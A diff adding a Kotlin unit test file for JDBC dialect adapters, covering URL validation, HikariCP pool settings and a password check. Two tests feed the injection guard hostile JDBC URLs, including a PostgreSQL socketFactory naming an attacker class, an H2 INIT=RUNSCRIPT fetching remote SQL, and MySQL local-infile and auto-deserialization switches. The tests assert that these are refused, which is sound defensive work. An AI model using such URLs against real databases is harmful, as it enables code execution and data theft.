@@ -1,0 +1,195 @@
+package co.datapipelines.datasources
+
+import co.datapipelines.typesystem.Dialect
+import co.datapipelines.typesystem.TypeMappers
+import com.zaxxer.hikari.HikariConfig
+import io.kotest.assertions.throwables.shouldThrow
+import io.kotest.matchers.collections.shouldContainExactlyInAnyOrder
+import io.kotest.matchers.shouldBe
+import io.kotest.matchers.string.shouldContain
+import org.junit.jupiter.api.Test
+
+/**
+ * [DialectAdapter] behavior: registry completeness, driver/type-mapper wiring, JDBC-URL
+ * validation, the injection guard, and verbatim `HikariConfig` passthrough (datasources.md
+ * §4.2, §6.1, §13.2).
+ */
+class DialectAdaptersTest {
+    @Test
+    fun `every dialect has an adapter and none is duplicated`() {
+        DialectAdapters.all().map { it.dialect } shouldContainExactlyInAnyOrder Dialect.entries.toList()
+    }
+
+    @Test
+    fun `each adapter wires the driver class and type mapper for its dialect`() {
+        Dialect.entries.forEach { dialect ->
+            val adapter = DialectAdapters.forDialect(dialect)
+            adapter.jdbcDriverClassName shouldBe JdbcDrivers.classNameFor(dialect)
+            adapter.typeMapper shouldBe TypeMappers.forDialect(dialect)
+        }
+    }
+
+    @Test
+    fun `a well-formed URL for the dialect passes`() {
+        DialectAdapters
+            .forDialect(Dialect.POSTGRES)
+            .validateJdbcUrl("jdbc:postgresql://db.internal:5432/app?sslmode=verify-full")
+            .valid shouldBe true
+        DialectAdapters
+            .forDialect(Dialect.MSSQL)
+            .validateJdbcUrl("jdbc:sqlserver://db.internal:1433;databaseName=app;encrypt=true")
+            .valid shouldBe true
+    }
+
+    @Test
+    fun `a URL whose scheme does not match the dialect is rejected as scheme_invalid`() {
+        val result = DialectAdapters.forDialect(Dialect.POSTGRES).validateJdbcUrl("jdbc:mysql://h/db")
+
+        result.valid shouldBe false
+        result.errors.single().code shouldBe DatasourceErrorCodes.JDBC_URL_SCHEME_INVALID
+    }
+
+    @Test
+    fun `a URL that does not start with jdbc is scheme_invalid`() {
+        DialectAdapters
+            .forDialect(Dialect.POSTGRES)
+            .validateJdbcUrl("postgresql://h/db")
+            .errors
+            .single()
+            .code shouldBe DatasourceErrorCodes.JDBC_URL_SCHEME_INVALID
+    }
+
+    @Test
+    fun `a URL with the right scheme but empty sub-name is malformed`() {
+        DialectAdapters
+            .forDialect(Dialect.POSTGRES)
+            .validateJdbcUrl("jdbc:postgresql:")
+            .errors
+            .single()
+            .code shouldBe DatasourceErrorCodes.JDBC_URL_MALFORMED
+    }
+
+    @Test
+    fun `injection-surface properties smuggled into the URL are refused`() {
+        // PostgreSQL socketFactory loads an attacker-named class.
+        assertMalformed(Dialect.POSTGRES, "jdbc:postgresql://h/db?socketFactory=evil.Factory")
+        // H2 INIT runs arbitrary SQL at connect (RUNSCRIPT).
+        assertMalformed(Dialect.H2, "jdbc:h2:mem:t;INIT=RUNSCRIPT FROM 'http://x/e.sql'")
+        // MySQL local-infile / gadget-deserialization switches.
+        assertMalformed(Dialect.MYSQL, "jdbc:mysql://h/db?allowLoadLocalInfile=true")
+        assertMalformed(Dialect.MYSQL, "jdbc:mysql://h/db?autoDeserialize=true")
+    }
+
+    @Test
+    fun `the URL injection guard matches property names case-insensitively`() {
+        // Driver property lookup is case-insensitive, so a case-sensitive guard would be bypassed
+        // by 'SocketFactory' / 'init'. Without this case the guard assertions above would pass a
+        // case-sensitive implementation too.
+        assertMalformed(Dialect.POSTGRES, "jdbc:postgresql://h/db?SocketFactory=evil.Factory")
+        assertMalformed(Dialect.POSTGRES, "jdbc:postgresql://h/db?SOCKETFACTORY=evil.Factory")
+        assertMalformed(Dialect.H2, "jdbc:h2:mem:t;init=RUNSCRIPT FROM 'http://x/e.sql'")
+        assertMalformed(Dialect.MYSQL, "jdbc:mysql://h/db?AllowLoadLocalInfile=true")
+    }
+
+    @Test
+    fun `the URL scheme match is case-insensitive but still dialect-specific`() {
+        DialectAdapters.forDialect(Dialect.POSTGRES).validateJdbcUrl("JDBC:POSTGRESQL://h/db").valid shouldBe true
+    }
+
+    @Test
+    fun `a valid hikari property reaches HikariConfig verbatim`() {
+        val datasource =
+            Fixtures.h2(properties = DatasourceProperties(hikari = mapOf("maximumPoolSize" to 7, "minimumIdle" to 3)))
+
+        val config = DialectAdapters.forDialect(Dialect.H2).buildHikariConfig(datasource)
+
+        config.maximumPoolSize shouldBe 7
+        config.minimumIdle shouldBe 3
+        config.jdbcUrl shouldBe datasource.jdbcUrl
+        config.driverClassName shouldBe JdbcDrivers.classNameFor(Dialect.H2)
+    }
+
+    @Test
+    fun `a jdbc property is applied as a driver connection property, defaults first`() {
+        val datasource =
+            Fixtures.h2(properties = DatasourceProperties(jdbc = mapOf("ACCESS_MODE_DATA" to "r")))
+
+        val config = DialectAdapters.forDialect(Dialect.H2).buildHikariConfig(datasource)
+
+        config.dataSourceProperties.getProperty("ACCESS_MODE_DATA") shouldBe "r"
+    }
+
+    @Test
+    fun `minimumIdle defaults to the documented 2, not to HikariCP's maximumPoolSize`() {
+        // §5's table publishes minimumIdle = 2. HikariCP's own default is "same as
+        // maximumPoolSize" (10), so leaving it unset would keep 5x the documented number of
+        // connections warm against every source database.
+        val config = DialectAdapters.forDialect(Dialect.H2).buildHikariConfig(Fixtures.h2())
+
+        config.minimumIdle shouldBe AbstractDialectAdapter.DEFAULT_MINIMUM_IDLE
+        config.minimumIdle shouldBe 2
+    }
+
+    @Test
+    fun `an explicit minimumIdle is preserved, including the documented zero`() {
+        val explicit = Fixtures.h2(properties = DatasourceProperties(hikari = mapOf("minimumIdle" to 7)))
+        DialectAdapters.forDialect(Dialect.H2).buildHikariConfig(explicit).minimumIdle shouldBe 7
+
+        // 0 is a legitimate operator choice (keep nothing warm) and must not be mistaken for
+        // "unset" — a null/zero-based check for the default would silently overwrite it with 2.
+        val noneWarm = Fixtures.h2(properties = DatasourceProperties(hikari = mapOf("minimumIdle" to 0)))
+        DialectAdapters.forDialect(Dialect.H2).buildHikariConfig(noneWarm).minimumIdle shouldBe 0
+    }
+
+    @Test
+    fun `a mis-cased hikari property is rejected - HikariCP resolves names case-sensitively`() {
+        // Verified against the pinned HikariCP: PropertyElf.setProperty throws "Property
+        // minimumidle does not exist on target class". Recorded as a test because the §5.6
+        // denylists deliberately match case-INsensitively (a refused key must not be bypassable
+        // by re-casing), and the two rules are easy to conflate.
+        val result =
+            DatasourceValidator().validate(
+                Fixtures.h2(properties = DatasourceProperties(hikari = mapOf("minimumidle" to 5))),
+                isCreate = true,
+            )
+
+        result.errors.single { it.code == DatasourceErrorCodes.PROPERTIES_INVALID }.field shouldContain "minimumidle"
+    }
+
+    @Test
+    fun `query_timeout_seconds is not a pool property - Hikari timeouts stay at their defaults`() {
+        // §5.5: the query timeout is an execution-layer, per-statement policy applied by the
+        // executor. Leaking it into connectionTimeout or validationTimeout would silently change
+        // how long a lease waits. (The positive precedence test lives with the executor.)
+        val defaults = HikariConfig()
+        val datasource = Fixtures.h2(queryTimeoutSeconds = 45)
+
+        val config = DialectAdapters.forDialect(Dialect.H2).buildHikariConfig(datasource)
+
+        config.connectionTimeout shouldBe defaults.connectionTimeout
+        config.validationTimeout shouldBe defaults.validationTimeout
+        config.maxLifetime shouldBe defaults.maxLifetime
+        config.idleTimeout shouldBe defaults.idleTimeout
+    }
+
+    @Test
+    fun `building a pool without a plaintext password is refused, not silently blank`() {
+        // DS-SEC-10: `password ?: ""` would have opened a real connection with an empty
+        // credential — against a DB that allows blank passwords, silently succeeding.
+        val thrown =
+            shouldThrow<IllegalArgumentException> {
+                DialectAdapters.forDialect(Dialect.H2).buildHikariConfig(Fixtures.h2(password = null))
+            }
+
+        thrown.message.orEmpty() shouldContain "test_h2"
+    }
+
+    private fun assertMalformed(
+        dialect: Dialect,
+        url: String,
+    ) {
+        val result = DialectAdapters.forDialect(dialect).validateJdbcUrl(url)
+        result.valid shouldBe false
+        result.errors.single().code shouldBe DatasourceErrorCodes.JDBC_URL_MALFORMED
+    }
+}
